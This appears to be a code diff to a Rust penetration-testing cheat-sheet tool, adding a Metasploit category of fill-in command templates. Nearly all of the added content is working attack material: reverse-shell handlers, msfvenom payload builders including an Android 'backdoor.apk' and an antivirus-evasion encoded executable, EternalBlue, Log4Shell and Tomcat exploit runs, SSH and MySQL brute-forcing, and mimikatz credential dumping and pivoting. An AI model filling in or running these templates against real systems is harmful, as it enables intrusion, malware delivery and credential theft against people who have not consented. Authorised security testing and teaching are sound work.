@@ -21,20 +21,22 @@ pub enum Category {
     Hydra,
     Post,
     Crypto,
+    Metasploit,
 }
 
 impl Category {
     pub fn label(&self) -> &'static str {
         match self {
-            Category::Recon => "🔍 Recon / nmap",
-            Category::Web => "🌐 Web (ffuf/gobuster/nikto)",
-            Category::Smb => "📁 SMB / enum4linux",
-            Category::Sqli => "💉 SQLi / XSS helpers",
-            Category::Shells => "🐚 Reverse Shells",
-            Category::Cve => "🔥 CVE Lookups",
-            Category::Hydra => "🔑 Brute Force (hydra)",
-            Category::Post => "🎯 Post-Exploitation",
-            Category::Crypto => "🔐 Crypto / Cracking",
+            Category::Recon => "ヾ(=`ω´=)ノ” Recon / nmap",
+            Category::Web => "o(≧▽≦)o Web (ffuf/gobuster/nikto)",
+            Category::Smb => "(„•ᴗ•„) SMB / enum4linux",
+            Category::Sqli => "(´｡• ω •｡`) ♡ SQLi / XSS helpers",
+            Category::Shells => "(„ಡωಡ„) Reverse Shells",
+            Category::Cve => "凸(￣ヘ￣) CVE Lookups",
+            Category::Hydra => "((╬◣﹏◢)) Brute Force (hydra)",
+            Category::Post => "(-ω-、) Post-Exploitation",
+            Category::Crypto => "┐(￣～￣)┌ Crypto / Cracking",
+            Category::Metasploit => "(≧▽≦)/ Metasploit Framework",
         }
     }
 
@@ -49,6 +51,7 @@ impl Category {
             Category::Hydra,
             Category::Post,
             Category::Crypto,
+            Category::Metasploit,
         ]
     }
 
@@ -63,6 +66,7 @@ impl Category {
             "hydra" | "brute" | "bruteforce" => Some(Category::Hydra),
             "post" | "postex" | "privesc" => Some(Category::Post),
             "crypto" | "crack" | "hash" => Some(Category::Crypto),
+            "msf" | "metasploit" => Some(Category::Metasploit),
             _ => None,
         }
     }
@@ -1085,6 +1089,7 @@ pub fn get_commands(category: &Category) -> &'static [Command] {
         Category::Hydra => HYDRA_COMMANDS,
         Category::Post => POST_COMMANDS,
         Category::Crypto => CRYPTO_COMMANDS,
+        Category::Metasploit => MSF_COMMANDS,
     }
 }
 
@@ -1095,3 +1100,233 @@ pub fn resolve_template(template: &str, params: &std::collections::HashMap<Strin
     }
     result
 }
+// ─── METASPLOIT ────────────────────────────────────────────────────────────
+
+pub const MSF_COMMANDS: &[Command] = &[
+    // --- Multi-handler (catch shells) ---
+    Command {
+        name: "MSF - Multi Handler",
+        description: "Catch reverse shells (set payload manually)",
+        template: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'",
+        params: &[
+            Param { key: "payload", label: "Payload (linux/x64/shell_reverse_tcp)", default: Some("linux/x64/shell_reverse_tcp") },
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["msf", "handler", "catch"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Meterpreter Handler",
+        description: "Catch Meterpreter reverse TCP",
+        template: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["msf", "meterpreter", "handler"],
+        category: Category::Metasploit,
+    },
+    // --- Payload generation ---
+    Command {
+        name: "MSFvenom - Linux ELF (staged)",
+        description: "Linux x64 staged reverse shell ELF",
+        template: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("shell.elf") },
+        ],
+        tags: &["msfvenom", "linux", "elf", "staged"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - Windows EXE (staged)",
+        description: "Windows x64 staged Meterpreter EXE",
+        template: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("shell.exe") },
+        ],
+        tags: &["msfvenom", "windows", "exe", "staged"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - PHP Meterpreter",
+        description: "PHP Meterpreter payload for web upload",
+        template: "msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("shell.php") },
+        ],
+        tags: &["msfvenom", "php", "webshell"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - JSP War",
+        description: "JSP WAR for Tomcat upload",
+        template: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("shell.war") },
+        ],
+        tags: &["msfvenom", "jsp", "war", "tomcat"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - Android APK",
+        description: "Android Meterpreter APK backdoor",
+        template: "msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("backdoor.apk") },
+        ],
+        tags: &["msfvenom", "android", "apk", "mobile"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - Python",
+        description: "Python Meterpreter payload",
+        template: "msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "output", label: "Output file", default: Some("shell.py") },
+        ],
+        tags: &["msfvenom", "python", "meterpreter"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSFvenom - Encoded Shikata",
+        description: "Encoded Windows payload (bypass AV)",
+        template: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x64/shikata_ga_nai -i {iterations} -f exe -o {output}",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+            Param { key: "iterations", label: "Encoding iterations", default: Some("10") },
+            Param { key: "output", label: "Output file", default: Some("encoded.exe") },
+        ],
+        tags: &["msfvenom", "encode", "shikata", "av-evasion"],
+        category: Category::Metasploit,
+    },
+    // --- Exploits ---
+    Command {
+        name: "MSF - EternalBlue",
+        description: "MS17-010 SMB RCE (check first!)",
+        template: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["msf", "eternalblue", "ms17-010", "smb"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Log4j",
+        description: "Log4Shell JNDI exploit (check target first)",
+        template: "msfconsole -q -x 'use exploit/multi/http/log4shell_header_injection; set RHOSTS {target}; set RPORT {port}; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "port", label: "Target port", default: Some("8080") },
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["msf", "log4j", "log4shell", "jndi"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Tomcat Manager Upload",
+        description: "Deploy WAR via Tomcat manager",
+        template: "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set RPORT {port}; set HttpUsername {user}; set HttpPassword {pass}; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "port", label: "Tomcat port", default: Some("8080") },
+            Param { key: "user", label: "Manager username", default: Some("tomcat") },
+            Param { key: "pass", label: "Manager password", default: Some("tomcat") },
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["msf", "tomcat", "war", "upload"],
+        category: Category::Metasploit,
+    },
+    // --- Auxiliaries ---
+    Command {
+        name: "MSF - SMB Version",
+        description: "Enumerate SMB version",
+        template: "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {target}; run; exit'",
+        params: &[Param { key: "target", label: "Target IP/range", default: None }],
+        tags: &["msf", "smb", "version", "aux"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - SSH Login Check",
+        description: "Test SSH credentials with MSF",
+        template: "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS {target}; set USERNAME {user}; set PASSWORD {pass}; run; exit'",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("root") },
+            Param { key: "pass", label: "Password", default: Some("password") },
+        ],
+        tags: &["msf", "ssh", "login", "aux"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - MySQL Login",
+        description: "Brute MySQL with MSF",
+        template: "msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS {target}; set USERNAME {user}; set PASS_FILE {passfile}; run; exit'",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("root") },
+            Param { key: "passfile", label: "Password file", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["msf", "mysql", "brute", "aux"],
+        category: Category::Metasploit,
+    },
+    // --- Post-exploitation ---
+    Command {
+        name: "MSF - Hashdump",
+        description: "Dump password hashes from Meterpreter",
+        template: "# In Meterpreter session:\nhashdump\n# Or:\nrun post/windows/gather/hashdump",
+        params: &[],
+        tags: &["msf", "hashdump", "meterpreter", "post"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Kiwi (mimikatz)",
+        description: "Extract credentials with kiwi",
+        template: "# In Meterpreter session:\nload kiwi\ncreds_all\n# Or:\nkiwi_cmd sekurlsa::logonpasswords",
+        params: &[],
+        tags: &["msf", "kiwi", "mimikatz", "credentials"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Pivot (route add)",
+        description: "Add route through Meterpreter session",
+        template: "# In Meterpreter:\nrun autoroute -s {subnet}\n# Then background and use socks proxy:\nuse auxiliary/server/socks_proxy; run",
+        params: &[Param { key: "subnet", label: "Target subnet (e.g. 10.10.10.0/24)", default: None }],
+        tags: &["msf", "pivot", "route", "socks"],
+        category: Category::Metasploit,
+    },
+    Command {
+        name: "MSF - Search Exploits",
+        description: "Search MSF for modules",
+        template: "msfconsole -q -x 'search {query}; exit'",
+        params: &[Param { key: "query", label: "Search term (e.g. eternalblue)", default: None }],
+        tags: &["msf", "search", "find"],
+        category: Category::Metasploit,
+    },
+    // --- Resource scripts ---
+    Command {
+        name: "MSF - Resource Script",
+        description: "Run commands from resource file",
+        template: "msfconsole -q -r {resource}",
+        params: &[Param { key: "resource", label: "Resource script path", default: Some("auto.rc") }],
+        tags: &["msf", "resource", "script", "automation"],
+        category: Category::Metasploit,
+    },
+];
